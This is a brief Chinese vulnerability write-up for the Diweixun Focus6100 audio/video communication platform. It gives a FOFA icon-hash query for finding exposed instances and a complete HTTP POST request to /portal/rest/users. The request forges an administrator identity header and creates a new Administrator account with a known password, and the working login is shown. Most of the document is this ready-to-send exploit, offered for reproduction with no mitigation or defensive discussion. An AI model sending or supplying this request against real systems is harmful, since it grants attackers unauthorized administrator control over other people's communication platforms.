# 迪威讯Focus6100音视频通讯平台存在任意用户添加漏洞

# 一、漏洞简介
迪威讯Focus6100音视频通讯平台存在任意用户添加漏洞

# 二、影响版本
+ 迪威讯Focus6100音视频通讯平台

# 三、资产测绘
+ fofa`web.icon=="bbc933535a6bfe478afb1fd0b3c470bf"`
+ 特征

![1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3.png](./img/0oTztu8wtNxM6fDr/1727236496776-a86037c1-f827-4701-8df6-d3ff921c09b3-858583.png)

# 四 、漏洞复现
```java
POST /portal/rest/users HTTP/1.1
Host: 
Content-Length: 85
Accept: application/json, text/plain, */*
Current-User: admin|Administrator
Accept-Language: zh-CN
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Connection: close

{"role":"Administrator","name":"test1","password":"e10adc3949ba59abbe56e057f20f883e"}
```

![1727236694945-4d6de57a-5d7b-466c-9196-174780417908.png](./img/0oTztu8wtNxM6fDr/1727236694945-4d6de57a-5d7b-466c-9196-174780417908-597623.png)

test1/123456

![1727236724047-c0a67d6a-2398-4693-99a3-c094b0c6125c.png](./img/0oTztu8wtNxM6fDr/1727236724047-c0a67d6a-2398-4693-99a3-c094b0c6125c-790238.png)



> 更新: 2024-10-22 09:36:09  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/psg86y8exbitmfsk>